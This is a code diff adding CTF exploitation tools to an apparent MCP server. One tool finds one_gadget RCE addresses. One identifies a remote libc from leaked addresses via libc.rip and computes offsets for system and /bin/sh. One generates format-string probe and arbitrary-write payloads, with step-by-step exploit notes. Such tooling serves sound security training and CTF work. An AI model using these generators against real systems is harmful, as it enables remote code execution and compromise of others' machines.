@@ -16,7 +16,9 @@ mcp = FastMCP(
     instructions=(
         "Binary exploitation (pwn) tools for CTF challenges. "
         "Start with pwn_triage for a comprehensive overview, then use "
-        "pwn_disassemble, pwn_rop_gadgets, or pwn_pwntools_template as needed."
+        "pwn_disassemble, pwn_rop_gadgets, pwn_pwntools_template, pwn_format_string, "
+        "pwn_one_gadget (single-gadget RCE in libc), or pwn_libc_lookup (identify libc "
+        "version from leaked addresses) as needed."
     ),
 )
 
@@ -679,6 +681,227 @@ def pwn_angr_analyze(
         result["error"] = str(e)
 
     return json.dumps(result, indent=2)
+
+
+# ── one_gadget ────────────────────────────────────────────────────────────────
+
+
+@mcp.tool()
+def pwn_one_gadget(
+    libc_path: str,
+) -> str:
+    """Find single-gadget RCE addresses in a libc binary using one_gadget.
+
+    Returns gadget addresses and their register/memory constraints.
+    Use these instead of full ROP chains when constraints are satisfiable.
+
+    Args:
+        libc_path: Path to the libc shared library
+    """
+    path = os.path.realpath(libc_path)
+    if not os.path.isfile(path):
+        return json.dumps({"error": f"File not found: {path}"})
+
+    r = run_tool(["one_gadget", path], timeout=60)
+    if r["returncode"] != 0:
+        return json.dumps(
+            {"error": r["stderr"] or r.get("error", "one_gadget failed")}, indent=2
+        )
+
+    gadgets = []
+    current = None
+    for line in r["stdout"].splitlines():
+        line = line.rstrip()
+        if line.startswith("0x"):
+            if current:
+                gadgets.append(current)
+            addr = line.split()[0]
+            current = {"address": addr, "constraints": [], "instructions": []}
+        elif current and line.startswith("constraints:"):
+            pass  # header line
+        elif current and line.strip().startswith("["):
+            current["constraints"].append(line.strip())
+        elif current and line.strip():
+            current["instructions"].append(line.strip())
+    if current:
+        gadgets.append(current)
+
+    return json.dumps(
+        {"libc": path, "gadget_count": len(gadgets), "gadgets": gadgets}, indent=2
+    )
+
+
+# ── libc_lookup ───────────────────────────────────────────────────────────────
+
+
+@mcp.tool()
+def pwn_libc_lookup(
+    symbols: str,
+) -> str:
+    """Identify a remote libc version from leaked function addresses via libc.rip.
+
+    Args:
+        symbols: JSON string mapping symbol names to leaked hex addresses,
+                 e.g. '{"puts": "0x7f1234567890", "printf": "0x7f1234567abc"}'
+
+    The tool computes page offsets (last 12 bits) automatically and queries
+    the libc.rip database. Returns matching libc versions with key offsets
+    (system, /bin/sh, __free_hook) and the computed libc base address.
+    """
+    import requests
+
+    try:
+        sym_dict = json.loads(symbols)
+    except json.JSONDecodeError as e:
+        return json.dumps({"error": f"Invalid JSON symbols: {e}"}, indent=2)
+
+    if not sym_dict:
+        return json.dumps({"error": "Empty symbols dict"}, indent=2)
+
+    # Compute last 12 bits (page offset) for each symbol
+    api_symbols = {}
+    for name, addr in sym_dict.items():
+        addr_int = int(addr, 16) if isinstance(addr, str) else addr
+        api_symbols[name] = hex(addr_int & 0xFFF)
+
+    try:
+        resp = requests.post(
+            "https://libc.rip/api/find",
+            json={"symbols": api_symbols},
+            timeout=15,
+        )
+        resp.raise_for_status()
+        matches = resp.json()
+    except Exception as e:
+        return json.dumps({"error": f"libc.rip API failed: {e}"}, indent=2)
+
+    results = []
+    for match in matches[:10]:
+        entry = {
+            "id": match.get("id", ""),
+            "buildid": match.get("buildid", ""),
+            "download_url": match.get("download_url", ""),
+            "symbols": match.get("symbols", {}),
+        }
+        # Extract key offsets
+        syms = match.get("symbols", {})
+        for key in ("system", "str_bin_sh", "__free_hook", "__malloc_hook"):
+            if key in syms:
+                entry[f"{key}_offset"] = syms[key]
+        results.append(entry)
+
+    # Compute libc base from first match
+    if results and results[0].get("symbols"):
+        first_syms = results[0]["symbols"]
+        for name, addr in sym_dict.items():
+            if name in first_syms:
+                addr_int = int(addr, 16) if isinstance(addr, str) else addr
+                sym_offset = (
+                    int(first_syms[name], 16)
+                    if isinstance(first_syms[name], str)
+                    else first_syms[name]
+                )
+                results[0]["computed_base"] = hex(addr_int - sym_offset)
+                break
+
+    return json.dumps(
+        {"query": sym_dict, "match_count": len(results), "matches": results}, indent=2
+    )
+
+
+# ── format_string ─────────────────────────────────────────────────────────────
+
+
+@mcp.tool()
+def pwn_format_string(
+    mode: str = "find_offset",
+    offset: int = 0,
+    writes: str = "",
+    arch: str = "amd64",
+    padding: int = 0,
+) -> str:
+    """Generate format string exploit payloads using pwntools.
+
+    Args:
+        mode: "find_offset" (probe payload), "write" (arbitrary write), "info" (reference)
+        offset: Stack offset where format string input appears (for write mode)
+        writes: JSON dict of {hex_addr: hex_value} for write mode,
+                e.g. '{"0x404020": "0x401234"}'
+        arch: Architecture — "amd64" or "i386" (default "amd64")
+        padding: Bytes already written before format string (numbwritten for pwntools)
+    """
+    import pwn
+
+    with pwn.context.local(arch=arch):
+        if mode == "find_offset":
+            probe = ".".join(f"%{i}$p" for i in range(1, 30))
+            return json.dumps(
+                {
+                    "mode": "find_offset",
+                    "probe_payload": probe,
+                    "instructions": (
+                        "Send this payload as input. Look for '0x25702e25' (hex of '%p.%') "
+                        "or your input bytes in the output. The position N where your input "
+                        "appears is the format string offset. Use that as the 'offset' "
+                        "parameter in write mode."
+                    ),
+                },
+                indent=2,
+            )
+
+        elif mode == "write":
+            if not writes:
+                return json.dumps(
+                    {"error": "write mode requires 'writes' parameter"}, indent=2
+                )
+            try:
+                write_dict = {
+                    int(addr, 16): int(val, 16)
+                    for addr, val in json.loads(writes).items()
+                }
+            except (json.JSONDecodeError, ValueError) as e:
+                return json.dumps({"error": f"Invalid writes JSON: {e}"}, indent=2)
+
+            try:
+                payload = pwn.fmtstr_payload(offset, write_dict, numbwritten=padding)
+            except Exception as e:
+                return json.dumps({"error": f"fmtstr_payload failed: {e}"}, indent=2)
+
+            return json.dumps(
+                {
+                    "mode": "write",
+                    "offset": offset,
+                    "writes": writes,
+                    "payload_hex": payload.hex(),
+                    "payload_length": len(payload),
+                },
+                indent=2,
+            )
+
+        elif mode == "info":
+            return json.dumps(
+                {
+                    "mode": "info",
+                    "format_specifiers": {
+                        "%p": "Print stack value as pointer (leak addresses)",
+                        "%s": "Print string at address on stack (arbitrary read)",
+                        "%n": "Write count of chars printed to address on stack",
+                        "%N$p": "Direct parameter access: print Nth stack value",
+                        "%N$n": "Write to address at Nth stack position",
+                        "%hhn": "Write single byte (mod 256)",
+                        "%hn": "Write 2 bytes (mod 65536)",
+                    },
+                    "exploit_steps": [
+                        "1. Find offset: send '%p.%p.%p...' to find where input appears on stack",
+                        "2. Leak addresses: use %N$p to read specific stack positions (libc, canary, etc.)",
+                        "3. Arbitrary read: place address on stack, use %N$s to read string there",
+                        "4. Arbitrary write: use pwn_format_string(mode='write', offset=N, writes='{\"addr\": \"val\"}')",
+                    ],
+                },
+                indent=2,
+            )
+
+    return json.dumps({"error": f"Unknown mode: {mode}"}, indent=2)
 
 
 if __name__ == "__main__":
